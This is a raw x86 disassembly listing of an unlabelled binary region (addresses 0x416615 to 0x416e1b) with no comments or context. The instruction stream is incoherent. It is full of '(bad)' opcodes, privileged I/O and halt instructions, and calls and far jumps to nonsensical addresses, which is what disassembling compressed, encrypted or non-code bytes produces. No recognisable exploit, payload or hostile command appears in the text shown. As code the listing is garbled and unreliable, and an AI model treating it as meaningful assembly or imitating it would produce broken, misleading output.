  416615:	(bad)  
  416616:	(bad)
  416619:	mov    ebx,ebp
  41661b:	xor    al,0xf
  41661d:	push   es
  41661e:	cmp    esi,ebp
  416620:	loopne 0x416656
  416622:	sbb    eax,0xaaafc7ec
  416627:	ret    
  416628:	test   DWORD PTR [ebp+edi*1+0x55],esp
  41662c:	adc    edx,DWORD PTR [ebx+0x11]
  41662f:	cwde   
  416630:	dec    bh
  416632:	mov    eax,ds:0x1e327cda
  416637:	cmp    DWORD PTR [edx+0x6ef7ea4],ebx
  41663d:	xor    ecx,DWORD PTR [edi-0x55]
  416640:	fstp   TBYTE PTR [edx]
  416642:	in     al,0xd2
  416644:	adc    al,0xcf
  416646:	cmc    
  416647:	and    al,0x12
  416649:	fxch   st(2)
  41664b:	test   BYTE PTR [edi+0x760227e0],al
  416651:	scas   al,BYTE PTR es:[edi]
  416652:	pushf  
  416653:	int3   
  416654:	pop    esp
  416655:	cwde   
  416656:	pusha  
  416657:	call   0x8117725b
  41665c:	inc    edx
  41665d:	std    
  41665e:	cld    
  41665f:	add    edx,DWORD PTR [ecx+0x71]
  416662:	pop    ss
  416663:	pushf  
  416664:	std    
  416665:	mov    dl,0xb3
  416667:	push   ecx
  416668:	ins    DWORD PTR es:[edi],dx
  416669:	and    BYTE PTR [ebx],al
  41666b:	popf   
  41666c:	ror    BYTE PTR [ebx+ecx*2+0x7861ba1f],cl
  416673:	das    
  416674:	jns    0x4166e1
  416676:	push   edx
  416677:	std    
  416678:	lahf   
  416679:	test   ah,dl
  41667b:	jmp    esi
  41667d:	mov    ah,0x69
  41667f:	pop    edi
  416680:	mov    al,ds:0xe1493f1a
  416685:	mov    edi,0xe6c9c5c7
  41668a:	daa    
  41668b:	hlt    
  41668c:	fld    st(2)
  41668e:	mov    bl,0x91
  416690:	sti    
  416691:	add    eax,0x9de29ba7
  416696:	out    0xdf,eax
  416698:	jle    0x416701
  41669a:	adc    BYTE PTR [esi-0x62],ch
  41669d:	(bad)  
  41669e:	jbe    0x416717
  4166a0:	loope  0x416719
  4166a2:	push   0x13352ab4
  4166a7:	jae    0x41662b
  4166a9:	test   DWORD PTR [ecx],ebp
  4166ab:	sahf   
  4166ac:	and    eax,0x6ab5013
  4166b1:	xor    bl,BYTE PTR [ebx+ecx*4]
  4166b4:	xchg   esp,eax
  4166b5:	inc    ebp
  4166b6:	addr16 push esi
  4166b8:	push   0xb8c3f515
  4166bd:	sti    
  4166be:	mov    dl,0xe7
  4166c0:	shl    DWORD PTR ds:0xaa31b4b3,0x29
  4166c7:	sbb    al,0x18
  4166c9:	pusha  
  4166ca:	enter  0x6533,0xa4
  4166ce:	xor    ecx,edi
  4166d0:	mov    esp,esp
  4166d2:	add    esi,DWORD PTR ds:0x786c3d24
  4166d8:	mov    ch,0x10
  4166da:	mov    ebx,0x98855dd8
  4166df:	jae    0x416709
  4166e1:	adc    al,0xd
  4166e3:	sbb    al,0x6a
  4166e5:	les    ebp,FWORD PTR [ebx+0x26]
  4166e8:	push   ecx
  4166e9:	ss adc ch,bl
  4166ec:	or     al,0x43
  4166ee:	dec    edx
  4166ef:	sar    BYTE PTR [ecx-0x35ab73d7],1
  4166f5:	push   ebp
  4166f6:	stos   BYTE PTR es:[edi],al
  4166f7:	mov    ch,BYTE PTR [eax]
  4166f9:	ror    cl,0x16
  4166fc:	fild   DWORD PTR [ecx]
  4166fe:	sub    edx,DWORD PTR ss:[ecx]
  416701:	imul   DWORD PTR [ebx+0x5e]
  416704:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416705:	gs repz popf 
  416708:	jnp    0x416715
  41670a:	mov    ecx,0xe65e50b
  41670f:	xchg   DWORD PTR [edi],esi
  416711:	push   ss
  416712:	in     al,0x30
  416714:	and    ch,bl
  416716:	jno    0x41669b
  416718:	sub    ch,BYTE PTR [edi-0x14432d30]
  41671e:	add    DWORD PTR [ecx-0xa],0x4a4d891d
  416725:	push   ebp
  416726:	sub    dh,0x7f
  416729:	xor    edi,esp
  41672b:	push   ss
  41672c:	mov    ah,0x3b
  41672e:	push   ebx
  41672f:	dec    BYTE PTR [eax-0x1aa937]
  416735:	push   esi
  416736:	dec    ecx
  416737:	jns    0x4167b4
  416739:	cmp    eax,0x94fffb1e
  41673e:	add    BYTE PTR [edi],0xd3
  416741:	pushf  
  416742:	test   DWORD PTR [edi-0x48],ecx
  416745:	jno    0x416743
  416747:	cmp    eax,0x2a1deb6d
  41674c:	mov    cl,0x11
  41674e:	fadd   DWORD PTR [esi]
  416750:	mov    ds:0x2ac4831c,al
  416755:	out    dx,eax
  416756:	cld    
  416757:	int3   
  416758:	or     eax,0xaee54ca9
  41675d:	nop
  41675e:	cld    
  41675f:	xchg   edi,eax
  416760:	sub    eax,edi
  416762:	(bad)  
  416763:	jmp    0x784671a8
  416768:	inc    ecx
  416769:	popf   
  41676a:	cmp    eax,0x267f8a40
  41676f:	aaa    
  416770:	and    DWORD PTR [edx],esi
  416772:	repnz in al,0xaa
  416775:	popa   
  416776:	cmp    bh,BYTE PTR [edx]
  416778:	lods   eax,DWORD PTR ds:[esi]
  416779:	xor    bl,BYTE PTR [ecx]
  41677b:	dec    edi
  41677c:	pop    ebx
  41677d:	cmp    bh,BYTE PTR [ebx]
  41677f:	dec    ebp
  416780:	adc    bh,BYTE PTR [ecx-0x73]
  416783:	ret    
  416784:	in     eax,dx
  416785:	test   al,0x45
  416787:	or     DWORD PTR [ecx],esp
  416789:	(bad)  
  41678a:	cmp    DWORD PTR [edi-0x281043b8],ebp
  416790:	push   cs
  416791:	jae    0x4167d6
  416793:	mov    ah,0xfe
  416795:	adc    edx,ecx
  416797:	pushf  
  416798:	mov    eax,0x7d68f04a
  41679d:	std    
  41679e:	sub    eax,0xbc07b0c7
  4167a3:	loopne 0x416812
  4167a5:	leave  
  4167a6:	xor    eax,0x489a29e
  4167ab:	clc    
  4167ac:	mov    bl,0xd5
  4167ae:	adc    BYTE PTR fs:[ecx+0x23099011],dh
  4167b5:	mov    ecx,0x67ef7c80
  4167ba:	jmp    FWORD PTR [ecx]
  4167bc:	arpl   WORD PTR [ebp-0x734662df],cx
  4167c2:	mov    ecx,esp
  4167c4:	inc    esi
  4167c5:	xchg   esi,eax
  4167c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167c7:	pop    esp
  4167c8:	fisttp QWORD PTR [edx-0x12]
  4167cb:	jg     0x41676b
  4167cd:	retf   0xc7c
  4167d0:	mov    edi,0xdce1f576
  4167d5:	imul   esp,DWORD PTR [eax+0x3208eaf7],0xffffffe0
  4167dc:	lds    eax,FWORD PTR [ecx+0x41a423f9]
  4167e2:	scas   eax,DWORD PTR es:[edi]
  4167e3:	das    
  4167e4:	mov    WORD PTR [eax-0x75],fs
  4167e7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4167e8:	dec    ecx
  4167e9:	(bad)  
  4167ea:	aad    0x95
  4167ec:	sub    BYTE PTR [eax],bh
  4167ee:	jg     0x416836
  4167f0:	xchg   edx,eax
  4167f1:	adc    al,dh
  4167f3:	hlt    
  4167f4:	inc    ecx
  4167f5:	mov    bl,0xd9
  4167f7:	ja     0x416848
  4167f9:	nop
  4167fa:	(bad)  
  4167fb:	test   al,0x8
  4167fd:	stos   DWORD PTR es:[edi],eax
  4167fe:	pop    ss
  4167ff:	mov    edi,es
  416801:	push   ss
  416802:	repz xchg esi,eax
  416804:	push   ebp
  416805:	retf   
  416806:	add    bl,dl
  416808:	in     al,dx
  416809:	cmp    DWORD PTR [ebp+0x4a],eax
  41680c:	pop    ecx
  41680d:	jge    0x416884
  41680f:	mov    bh,0x41
  416811:	outs   dx,BYTE PTR ds:[esi]
  416812:	enter  0x23f2,0xb7
  416816:	ror    cl,0x88
  416819:	cmp    esp,DWORD PTR [edx]
  41681b:	cld    
  41681c:	jae    0x416899
  41681e:	sub    bh,BYTE PTR [ebp+0x1c2c299a]
  416824:	push   edx
  416825:	sub    eax,0x693e9a2a
  41682a:	mov    bh,0xa6
  41682c:	xchg   DWORD PTR [edx+0x7f8fba81],ebx
  416832:	in     al,dx
  416833:	jno    0x416861
  416835:	or     al,0x7b
  416837:	in     eax,0x4b
  416839:	sub    edx,edi
  41683b:	jbe    0x416855
  41683d:	cmp    esp,DWORD PTR [ebx]
  41683f:	push   esp
  416840:	and    BYTE PTR [esi+0x4d55cdb4],bh
  416846:	hlt    
  416847:	mov    esi,0x7161d462
  41684c:	mov    ah,0xad
  41684e:	icebp  
  41684f:	popf   
  416850:	(bad)  
  416851:	push   ebp
  416852:	push   es
  416853:	adc    eax,0x8ea0a799
  416858:	pop    eax
  416859:	into   
  41685a:	xlat   BYTE PTR ds:[ebx]
  41685b:	push   edx
  41685c:	adc    DWORD PTR [ecx+0x68989730],ebx
  416862:	leave  
  416863:	sub    BYTE PTR [ecx],cl
  416865:	mov    ebx,0x74b50846
  41686a:	into   
  41686b:	mov    edx,0xdc110359
  416870:	aam    0xdb
  416872:	js     0x4168cd
  416874:	push   es
  416875:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416876:	outs   dx,BYTE PTR ds:[esi]
  416877:	(bad)
  41687c:	test   BYTE PTR [edi],al
  41687e:	jmp    0x41681d
  416880:	sbb    DWORD PTR [esp+eiz*8+0x7e],edx
  416884:	jo     0x416823
  416886:	mov    dl,bl
  416888:	cwde   
  416889:	cmp    al,0x2a
  41688b:	test   al,0x95
  41688d:	mov    fs:0x16e48f63,eax
  416893:	fucomip st,st(5)
  416895:	sti    
  416896:	pop    esi
  416897:	xor    al,0x9a
  416899:	into   
  41689a:	pop    es
  41689b:	test   DWORD PTR [ebx+0x6d079b00],edx
  4168a1:	pop    ebp
  4168a2:	sbb    BYTE PTR fs:[edi],bl
  4168a5:	xchg   edi,eax
  4168a6:	push   ecx
  4168a7:	test   DWORD PTR [ecx-0x47a60014],esi
  4168ad:	sub    bl,BYTE PTR [ebp+0x196c86c]
  4168b3:	xchg   ecx,eax
  4168b4:	mov    esp,0xc5a4c9b9
  4168b9:	adc    ecx,DWORD PTR gs:[esi]
  4168bc:	jmp    0xff681172
  4168c1:	arpl   WORD PTR [ebx],ax
  4168c3:	ins    DWORD PTR es:[edi],dx
  4168c4:	dec    edi
  4168c5:	pop    ecx
  4168c6:	xor    al,0x89
  4168c8:	stos   BYTE PTR es:[edi],al
  4168c9:	ret    0x265
  4168cc:	push   ss
  4168cd:	jmp    0x11d8c3c8
  4168d2:	loop   0x416889
  4168d4:	jae    0x416873
  4168d6:	dec    esi
  4168d7:	call   0xe9d3:0x5dea4843
  4168de:	enter  0x5510,0x70
  4168e2:	xor    al,BYTE PTR [edi-0x51]
  4168e5:	cmc    
  4168e6:	pop    ebp
  4168e7:	or     DWORD PTR [ebx-0xbccd648],0x3029809e
  4168f1:	sbb    eax,0x6f62495d
  4168f6:	mov    ds:0xc4872094,eax
  4168fb:	cmp    ah,cl
  4168fd:	sbb    esi,DWORD PTR [ecx-0x71]
  416900:	mov    ?,WORD PTR [edi]
  416902:	jnp    0x41689b
  416904:	ror    DWORD PTR [edi-0x42],1
  416907:	icebp  
  416908:	adc    dl,al
  41690a:	add    edi,DWORD PTR [edi-0x2f]
  41690d:	xor    DWORD PTR [esi+0x19],0x2537bb49
  416914:	push   cs
  416915:	push   cs
  416916:	or     DWORD PTR [esi+esi*8],0x2efc4fc9
  41691d:	mov    gs,WORD PTR [ebx-0x31]
  416920:	jnp    0x416941
  416922:	(bad)  
  416923:	lea    eax,[esi+0x3]
  416926:	cmp    ebx,DWORD PTR [ebx-0x47]
  416929:	push   eax
  41692a:	and    BYTE PTR [edi+0x3f4ccdb4],ch
  416930:	test   al,0x2d
  416932:	sbb    eax,0xd5d2dcfa
  416937:	pop    es
  416938:	inc    esp
  416939:	das    
  41693a:	jmp    0x367878c9
  41693f:	lock jo 0x4169ba
  416942:	mov    cl,BYTE PTR [ebx+0x54b2bda2]
  416948:	or     DWORD PTR [esi-0x49fb5760],eax
  41694e:	pop    ebp
  41694f:	or     eax,0xe87d29ee
  416954:	sbb    BYTE PTR [edx-0x6b6b292],0x6c
  41695b:	lods   al,BYTE PTR ds:[esi]
  41695c:	jmp    0xe7de:0x26405ba5
  416963:	shr    bh,0xfa
  416966:	jne    0x416999
  416968:	bound  eax,QWORD PTR [eax+0x5e]
  41696b:	and    BYTE PTR [ecx],0x42
  41696e:	mov    edi,0xe9fe1c9c
  416973:	pop    ds
  416974:	mov    bl,bl
  416976:	jo     0x416974
  416978:	jle    0x4169a0
  41697a:	pop    ebp
  41697b:	push   ss
  41697c:	loop   0x416936
  41697e:	add    esi,edi
  416980:	sahf   
  416981:	outs   dx,BYTE PTR ds:[esi]
  416982:	pop    ds
  416983:	retf   0xc97b
  416986:	and    eax,0xe257c99a
  41698b:	rol    esi,1
  41698d:	arpl   WORD PTR [eax-0x4b9d9f9c],bp
  416993:	out    dx,eax
  416994:	adc    DWORD PTR [eax+esi*1-0x23c64169],edi
  41699b:	mov    al,ds:0x32e61406
  4169a0:	aas    
  4169a1:	fsubr  DWORD PTR [edi+edx*4-0x74f063ad]
  4169a8:	dec    esi
  4169a9:	fstp   TBYTE PTR [esi-0x3fdf90ff]
  4169af:	repnz pop ebx
  4169b1:	mov    ds:0x9331acc3,al
  4169b6:	inc    ebp
  4169b7:	imul   ecx,DWORD PTR [ecx],0xffffffbc
  4169ba:	and    esp,DWORD PTR ds:0x172fbaae
  4169c0:	cmp    ebx,DWORD PTR [esi+0x3]
  4169c3:	gs je  0x41694f
  4169c6:	js     0x416959
  4169c8:	xor    al,BYTE PTR [edx-0x5a936840]
  4169ce:	sti    
  4169cf:	jge    0x416961
  4169d1:	add    cl,bh
  4169d3:	push   ecx
  4169d4:	sbb    DWORD PTR [esi+ebp*8],ebp
  4169d7:	iret   
  4169d8:	jb     0x4169c2
  4169da:	sbb    cl,bl
  4169dc:	jmp    0xda2c73fd
  4169e1:	add    edx,eax
  4169e3:	mov    dh,0x46
  4169e5:	adc    dl,BYTE PTR [ebp-0x24]
  4169e8:	xchg   ecx,eax
  4169e9:	lods   al,BYTE PTR ds:[esi]
  4169ea:	pop    esi
  4169eb:	mov    ah,0x23
  4169ed:	xchg   ebx,eax
  4169ee:	neg    BYTE PTR [edi+0x7e]
  4169f1:	mov    cl,0x9d
  4169f3:	jnp    0x4169ee
  4169f5:	jo     0x416a44
  4169f7:	and    eax,0xf8662153
  4169fc:	out    dx,eax
  4169fd:	xor    al,0x25
  4169ff:	cs mov ?,eax
  416a02:	scas   eax,DWORD PTR es:[edi]
  416a03:	push   esi
  416a04:	sahf   
  416a05:	jge    0x4169d7
  416a07:	dec    ebp
  416a08:	xor    eax,0x118aeaf6
  416a0d:	dec    esp
  416a0e:	and    ah,dl
  416a10:	sar    DWORD PTR [ebx-0x4b],cl
  416a13:	or     ah,BYTE PTR [edi+0x6274fe3a]
  416a19:	sub    BYTE PTR [esi-0x7282d575],0x57
  416a20:	or     eax,0xdd92536b
  416a25:	mov    al,0x63
  416a27:	cmp    al,0xaf
  416a29:	inc    edi
  416a2a:	push   ecx
  416a2b:	push   es
  416a2c:	push   edi
  416a2d:	sbb    cl,BYTE PTR ds:0x8cfb0684
  416a33:	nop
  416a34:	fiadd  WORD PTR [ebx+0x61a9fea3]
  416a3a:	sbb    esi,DWORD PTR [edi-0x44c09f92]
  416a40:	push   ss
  416a41:	xor    BYTE PTR [edi],al
  416a43:	std    
  416a44:	repz or bh,dh
  416a47:	nop
  416a48:	loopne 0x416a95
  416a4a:	call   0xbbe6e3d1
  416a4f:	scas   eax,DWORD PTR es:[edi]
  416a50:	add    al,0x7a
  416a52:	fwait
  416a53:	arpl   WORD PTR [ebx],bx
  416a55:	xchg   ecx,eax
  416a56:	in     al,dx
  416a57:	das    
  416a58:	call   0x90cf:0xcce185e8
  416a5f:	sar    BYTE PTR [edx-0x157e7dc4],cl
  416a65:	or     BYTE PTR [ebp+ebx*4+0x2b3d1813],dl
  416a6c:	add    al,0xc0
  416a6e:	shl    eax,0x2
  416a71:	fsub   DWORD PTR [edx+0x14]
  416a74:	mov    edi,0x2925fa9f
  416a79:	aam    0xb6
  416a7b:	mov    edi,0x50812388
  416a80:	ins    DWORD PTR es:[edi],dx
  416a81:	dec    esp
  416a82:	jmp    0x26d08377
  416a87:	arpl   cx,ax
  416a89:	scas   eax,DWORD PTR es:[edi]
  416a8a:	sub    DWORD PTR [ebx+edi*1],edi
  416a8d:	cmp    bh,BYTE PTR [edi+0x46bbc6fc]
  416a93:	aas    
  416a94:	shl    edx,0xc3
  416a97:	xchg   ecx,eax
  416a98:	push   0xffffffc2
  416a9a:	sbb    bh,BYTE PTR [ebx+0x57]
  416a9d:	je     0x416b0a
  416a9f:	ins    DWORD PTR es:[edi],dx
  416aa0:	loop   0x416ac9
  416aa2:	sub    BYTE PTR [ebp+0x70],0x5c
  416aa6:	mov    ecx,0xa36e69b7
  416aab:	push   ebx
  416aac:	enter  0xc29c,0x96
  416ab0:	sub    bh,bh
  416ab2:	mov    ?,WORD PTR [eax+eiz*4]
  416ab5:	aad    0x94
  416ab7:	jg     0x416a6c
  416ab9:	xor    al,0x4f
  416abb:	inc    DWORD PTR [edx-0x1cd8cba]
  416ac1:	and    eax,0xddcaf182
  416ac6:	jae    0x416af1
  416ac8:	loop   0x416b1b
  416aca:	cli    
  416acb:	jb     0x416b1d
  416acd:	jmp    0x504bfec5
  416ad2:	fisttp QWORD PTR [eax-0x21fb7fc3]
  416ad8:	xchg   DWORD PTR [esi],ecx
  416ada:	mov    esp,0x5f0d4cbe
  416adf:	sti    
  416ae0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416ae1:	pop    esi
  416ae2:	enter  0xc06e,0xab
  416ae6:	and    cl,dl
  416ae8:	out    dx,eax
  416ae9:	in     al,dx
  416aea:	pop    ebx
  416aeb:	mov    ch,0x8f
  416aed:	push   ds
  416aee:	jmp    FWORD PTR [edx+0xb]
  416af1:	push   ds
  416af2:	sbb    DWORD PTR [esi+0x4b],0xffffffc0
  416af6:	out    0x8c,al
  416af8:	jge    0x416a93
  416afa:	in     eax,dx
  416afb:	fld    TBYTE PTR [esp+ebx*2-0x74bd7daa]
  416b02:	xchg   ecx,eax
  416b03:	jno    0x416b58
  416b05:	add    al,0xb
  416b07:	fidiv  WORD PTR [ecx-0x670bc864]
  416b0d:	cwde   
  416b0e:	push   eax
  416b0f:	mov    cl,0xb2
  416b11:	push   0xc26c7936
  416b16:	(bad)  
  416b17:	xchg   ebx,eax
  416b18:	mov    ch,0xc7
  416b1a:	jp     0x416b79
  416b1c:	sar    bh,1
  416b1e:	and    bl,bl
  416b20:	stos   DWORD PTR es:[edi],eax
  416b21:	cmc    
  416b22:	ficomp WORD PTR [edi-0x1b]
  416b25:	shl    dl,cl
  416b27:	xchg   BYTE PTR fs:[edx+0x8eba1b1],dh
  416b2e:	inc    edx
  416b2f:	push   es
  416b30:	ja     0x416b39
  416b32:	pop    ebx
  416b33:	xor    esp,DWORD PTR [edx+0x508de181]
  416b39:	test   eax,0xda80fdf1
  416b3e:	push   ebp
  416b3f:	(bad)  
  416b40:	fucomp st(5)
  416b42:	enter  0x8705,0x5f
  416b46:	dec    ebp
  416b47:	or     edi,DWORD PTR [eax+0x3e6744d8]
  416b4d:	mov    al,ds:0xdb5a69b0
  416b52:	loopne 0x416b99
  416b54:	sub    eax,0x116988ae
  416b59:	add    al,0x23
  416b5b:	jmp    0x416b55
  416b5d:	jecxz  0x416b53
  416b5f:	repz mov esi,edi
  416b62:	xchg   edi,eax
  416b63:	ds inc ebx
  416b65:	jnp    0x416bc4
  416b67:	popf   
  416b68:	loope  0x416b81
  416b6a:	dec    ebp
  416b6b:	mov    edi,0x12e16d28
  416b70:	dec    ebp
  416b71:	jmp    DWORD PTR [edi]
  416b73:	mov    ds:0x9af6731c,eax
  416b78:	add    DWORD PTR [edx-0x66],ebx
  416b7b:	mov    ecx,0xd1ad0c71
  416b80:	mov    ebx,DWORD PTR [ecx]
  416b82:	out    0xb6,al
  416b84:	cmp    BYTE PTR [edi-0x3b1854f7],cl
  416b8a:	jmp    0xbf9a:0xc99d49cf
  416b91:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416b92:	mov    ds:0xe7dad9ed,al
  416b97:	and    ecx,DWORD PTR [ebp+0x3e]
  416b9a:	push   ds
  416b9b:	popf   
  416b9c:	xchg   ebx,eax
  416b9d:	or     esi,ecx
  416b9f:	cs fmul st(7),st
  416ba2:	mov    bh,0x69
  416ba4:	push   ebp
  416ba5:	jmp    0xe8b86f3
  416baa:	pusha  
  416bab:	iret   
  416bac:	sub    DWORD PTR [ebp+edi*2+0x49e784a9],ecx
  416bb3:	int3   
  416bb4:	mov    WORD PTR [ebp+ebp*4-0x4d],ds
  416bb8:	xor    BYTE PTR [esi+0x590fd4d1],bl
  416bbe:	ficomp WORD PTR [esi]
  416bc0:	imul   eax,edi,0x29ca3a71
  416bc6:	add    BYTE PTR [ebx+ebx*4+0x30819662],0x44
  416bce:	addr16 jo 0x416bc4
  416bd1:	mov    ebx,0x5bcf2b66
  416bd6:	aaa    
  416bd7:	xor    ebx,esi
  416bd9:	push   ds
  416bda:	and    dl,BYTE PTR [edx+0x7f728be0]
  416be0:	mov    ecx,0xbc98b0f0
  416be5:	pop    edi
  416be6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  416be7:	inc    ebp
  416be8:	jne    0x416c26
  416bea:	lds    edi,FWORD PTR [eax+edi*4]
  416bed:	add    eax,0xc7cd4dd0
  416bf2:	sub    ebx,ebx
  416bf4:	push   cs
  416bf5:	gs adc eax,0xc01bb906
  416bfb:	jmp    0xa23031ad
  416c00:	jle    0x416bd4
  416c02:	lea    ebx,[ecx+eax*4]
  416c05:	(bad)  [edi]
  416c07:	test   cl,cl
  416c09:	test   BYTE PTR [ebp-0x5d402748],al
  416c0f:	pusha  
  416c10:	pop    edi
  416c11:	pop    edi
  416c12:	fisttp WORD PTR ds:0x645363ed
  416c18:	test   ebx,ebp
  416c1a:	ret    
  416c1b:	jae    0x416be2
  416c1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  416c1e:	inc    ebp
  416c1f:	clc    
  416c20:	gs jb  0x416c7c
  416c23:	push   ebx
  416c24:	ins    DWORD PTR es:[edi],dx
  416c25:	es cmp eax,0xfa08774e
  416c2b:	jmp    0xe62b0b80
  416c30:	dec    esi
  416c31:	xchg   esp,eax
  416c32:	mov    bl,0x70
  416c34:	sbb    al,0xa8
  416c36:	mov    bh,0xc6
  416c38:	xchg   edx,eax
  416c39:	mov    cl,0xcc
  416c3b:	pop    ebx
  416c3c:	push   ecx
  416c3d:	stos   BYTE PTR es:[edi],al
  416c3e:	push   edi
  416c3f:	and    dl,BYTE PTR [edx+0x46]
  416c42:	xor    BYTE PTR [edi+0x6],bh
  416c45:	ins    DWORD PTR es:[edi],dx
  416c46:	mov    al,ds:0x37a1057
  416c4b:	jns    0x416c2d
  416c4d:	jbe    0x416bfe
  416c4f:	cmp    cl,dl
  416c51:	fsub   QWORD PTR [eax]
  416c53:	mov    esp,0xa0607c3b
  416c58:	sub    ecx,edx
  416c5a:	test   eax,0x215610d0
  416c5f:	scas   eax,DWORD PTR es:[edi]
  416c60:	(bad)  
  416c61:	inc    BYTE PTR [esi]
  416c63:	fld    DWORD PTR [ecx+edx*4+0x411608b7]
  416c6a:	push   esp
  416c6b:	pushf  
  416c6c:	mov    ?,WORD PTR [edx]
  416c6e:	and    dh,BYTE PTR ss:[esi-0x6b]
  416c72:	rcr    BYTE PTR [ebx+0x6],0x88
  416c76:	inc    esp
  416c77:	call   0x7342ba
  416c7c:	inc    edx
  416c7d:	xlat   BYTE PTR ds:[ebx]
  416c7e:	fs adc al,0x6d
  416c81:	enter  0x31e7,0x13
  416c85:	xchg   ebx,eax
  416c86:	cmp    BYTE PTR [esi+esi*8],0x43
  416c8a:	lahf   
  416c8b:	jns    0x416ce5
  416c8d:	mov    BYTE PTR ds:0x9255b7f4,ah
  416c93:	dec    edi
  416c94:	in     al,0xe1
  416c96:	out    dx,al
  416c97:	stos   BYTE PTR es:[edi],al
  416c98:	out    0xce,eax
  416c9a:	mov    edi,0xa8f93662
  416c9f:	jae    0x416c5f
  416ca1:	xor    DWORD PTR cs:[ecx-0x6b],ecx
  416ca5:	popa   
  416ca6:	mov    ah,0xdd
  416ca8:	fs and al,0x5b
  416cab:	lock call 0x381513cc
  416cb1:	cmc    
  416cb2:	or     bl,BYTE PTR [eax]
  416cb4:	adc    BYTE PTR [edi-0x55],0xe4
  416cb8:	dec    eax
  416cb9:	fwait
  416cba:	mov    al,0x89
  416cbc:	and    esi,DWORD PTR [edi-0x6ccc17e1]
  416cc2:	xor    ebx,0x7926c7d8
  416cc8:	aas    
  416cc9:	out    dx,eax
  416cca:	xchg   DWORD PTR [ebx+0x6e85605],eax
  416cd0:	clc    
  416cd1:	clc    
  416cd2:	xchg   ebp,eax
  416cd3:	or     al,0xe2
  416cd5:	mov    eax,0xc2782b18
  416cda:	out    dx,al
  416cdb:	xchg   edx,eax
  416cdc:	sub    al,0x8e
  416cde:	push   0x33
  416ce0:	icebp  
  416ce1:	lods   eax,DWORD PTR ds:[esi]
  416ce2:	sti    
  416ce3:	jnp    0x416d02
  416ce5:	mov    esi,0xa76b2246
  416cea:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  416ceb:	imul   ecx,DWORD PTR [edx-0x6e1b4179],0xd40c322f
  416cf5:	and    bh,BYTE PTR [esi+0x43]
  416cf8:	iret   
  416cf9:	sbb    ecx,DWORD PTR [esi-0x1f76e323]
  416cff:	hlt    
  416d00:	fs shl bl,cl
  416d03:	pop    edx
  416d04:	into   
  416d05:	sub    al,BYTE PTR [esi+0xca97348]
  416d0b:	inc    eax
  416d0c:	jae    0x416d69
  416d0e:	mov    cs,WORD PTR [edi+0x2b10fc04]
  416d14:	test   BYTE PTR [ebp-0x49],bh
  416d17:	adc    ecx,DWORD PTR [ecx+0x66]
  416d1a:	sbb    DWORD PTR [edi+ebx*4],ebx
  416d1d:	mov    eax,ds:0x58d6319c
  416d22:	or     al,0x2c
  416d24:	(bad)  
  416d25:	and    eax,DWORD PTR [ecx+0x439e429f]
  416d2b:	nop
  416d2c:	xlat   BYTE PTR ds:[ebx]
  416d2d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  416d2e:	cmp    ch,BYTE PTR [eax-0x43]
  416d31:	mov    WORD PTR [ebp-0x71],es
  416d34:	mov    WORD PTR [eax+0x72],fs
  416d37:	sbb    al,0x63
  416d39:	mov    esi,0x8713171f
  416d3e:	and    eax,0xc4d7b27b
  416d43:	adc    eax,0xa60da539
  416d48:	sub    eax,DWORD PTR [edx+ebp*2-0x7f79ae22]
  416d4f:	shl    DWORD PTR [edi+0x70],cl
  416d52:	mov    bh,0xc
  416d54:	test   BYTE PTR fs:[ecx],bl
  416d57:	test   ah,al
  416d59:	clc    
  416d5a:	imul   edi,DWORD PTR [esi],0xffffff89
  416d5d:	enter  0x5d69,0xe7
  416d61:	mov    DWORD PTR [eax+0x322d0b04],ebp
  416d67:	int    0xda
  416d69:	hlt    
  416d6a:	in     eax,0x8f
  416d6c:	xor    al,0x2f
  416d6e:	sbb    edi,DWORD PTR [edx+eiz*4-0x4a3c9aa5]
  416d75:	adc    sp,WORD PTR ds:0x28268f11
  416d7c:	sahf   
  416d7d:	mov    ds,WORD PTR [edi+0x32]
  416d80:	stc    
  416d81:	and    ah,BYTE PTR [edx+0x46ab1fff]
  416d87:	add    BYTE PTR [ebx],ch
  416d89:	sbb    al,0xb9
  416d8b:	int3   
  416d8c:	ss mov esp,0x5fb0edf5
  416d92:	sub    eax,0x69d13cc2
  416d97:	call   0x96efd7ea
  416d9c:	jae    0x416de5
  416d9e:	int3   
  416d9f:	mov    ch,0x30
  416da1:	lds    edx,FWORD PTR [ebx]
  416da3:	sti    
  416da4:	retf   0x5f75
  416da7:	sbb    edx,DWORD PTR [ebp+ebp*8-0x41]
  416dab:	adc    eax,0xd4bae2e
  416db0:	mov    edi,0xdba3a663
  416db5:	mov    BYTE PTR [ebp-0x30851b2b],0x14
  416dbc:	inc    esp
  416dbd:	inc    edx
  416dbe:	sti    
  416dbf:	ja     0x416e14
  416dc1:	(bad)  
  416dc2:	lea    esp,[eax+0x40]
  416dc5:	popa   
  416dc6:	inc    ecx
  416dc7:	out    dx,al
  416dc8:	das    
  416dc9:	int    0xdc
  416dcb:	sbb    al,0x41
  416dcd:	sar    BYTE PTR [ebp-0xf],0xdc
  416dd1:	xor    BYTE PTR [eax-0xb],0xbe
  416dd5:	popa   
  416dd6:	cmc    
  416dd7:	dec    eax
  416dd8:	nop
  416dd9:	push   0xffffffa3
  416ddb:	ffree  st(0)
  416ddd:	mov    eax,gs
  416ddf:	imul   esi,DWORD PTR [ebx],0x75f18bd3
  416de5:	inc    ebp
  416de6:	xchg   edi,eax
  416de7:	sti    
  416de8:	stc    
  416de9:	sahf   
  416dea:	cld    
  416deb:	fdiv   DWORD PTR [edx+0x4e2fde2b]
  416df1:	ins    DWORD PTR es:[edi],dx
  416df2:	mov    edi,0x96433da7
  416df7:	add    DWORD PTR [ebp+0x6dd6dbe3],esi
  416dfd:	jp     0x416da4
  416dff:	jns    0x416e13
  416e01:	popf   
  416e02:	push   es
  416e03:	popf   
  416e04:	jne    0x416dc9
  416e06:	push   edi
  416e07:	aad    0x3d
  416e09:	jnp    0x416de2
  416e0b:	fs iret 
  416e0d:	cli    
  416e0e:	ds sub eax,0x295b7f93
  416e14:	test   BYTE PTR [edi-0x37017a43],0xeb
  416e1b:	nop
